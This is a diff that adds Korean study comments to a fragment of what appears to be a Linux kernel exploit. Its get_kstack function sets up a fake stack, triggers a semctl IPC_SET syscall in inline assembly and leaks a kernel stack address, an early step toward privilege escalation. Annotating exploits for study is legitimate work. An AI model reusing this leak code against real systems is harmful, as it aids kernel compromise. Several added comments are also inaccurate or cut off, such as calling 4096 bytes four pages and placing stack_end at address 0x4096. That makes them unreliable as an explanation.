@@ -165,7 +165,7 @@ union semun {
 	struct seminfo *__buf;
 };
 
-struct region {
+struct region { // 커널 메모리를 프로세스별로 주소를 구하기 위해서. addrs변수를 두고 NPROC 상수 정의문만큼 프로세스를 반복해서 점검하기 위한 메모리 레이지온(영역자리) 표시기인,.
 	unsigned long parent;
 	unsigned long addrs[NPROC];
 };
@@ -223,18 +223,19 @@ unsigned long get_kstack(void)
 	}
 
 	/* map a fake stack to use during syscall */
+        // 스택 메모리를 MAP_32BIT로 둬서 32비트로 설정한 듯 보인, 익명 매핑이고, 개인 매핑, 읽기 |쓰기 가능하도록 설정한후  NULL(0x0 널주소)에 가상 메모리 4096(4page) 할당
 	stack_start = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0);
 	if (stack_start == MAP_FAILED) {
 		printf("[-] failure mapping memory, aborting!\n");
 		exit(1);
 	}
-	stack_end = stack_start + 4096;
+	stack_end = stack_start + 4096; // 커널 스택 종료 지점 0x4096 주소인(낮은 가상 메모리 주소를 말한,-
 
 	memset(arg, 0, sizeof(union semun));
 	memset(&dummy, 0, sizeof(struct semid_ds));
 	arg->buf = &dummy;
 
-	/* syscall(NR_IPC, SEMCTL, 0, 0, IPC_SET, arg) */
+	/* syscall(NR_IPC, SEMCTL, 0, 0, IPC_SET, arg) */ // NR_IPC  시스템콜과 SEMCTL 속성으로 메모리를 거져온
 	asm volatile (
 		"push %%rax\n"
 		"push %%rbx\n"
@@ -266,8 +267,8 @@ unsigned long get_kstack(void)
 	);
 
 	/* naively extract a pointer to the kstack from the kstack */
-	p = stack_end - (sizeof(unsigned long) + sizeof(struct semid64_ds)) + LEAK_OFFSET;
-	kstack = *(unsigned long *) p;
+	p = stack_end - (sizeof(unsigned long) + sizeof(struct semid64_ds)) + LEAK_OFFSET;  // sesmid64_ds 구조의 LEAK_OFFSET 위치 선점
+	kstack = *(unsigned long *) p; // 커널 스택 구한…
 
 	if (kstack < LEAK_BASE || kstack > LEAK_TOP) {
 		printf("[-] failed to leak a suitable kstack address, try again!\n");
@@ -278,7 +279,7 @@ unsigned long get_kstack(void)
 		exit(1);
 	}
 
-	kstack = kstack & ~0x1fff;
+	kstack = kstack & ~0x1fff; // 커널 스택을 0x1fff 2바이트 중 하위 두 바이트와. 0x1f 하위바로옆의 부분정도만 마스킹해서 커널 스택으로 만들어 아래에서 반환한,.
 	
 	return kstack;
 }
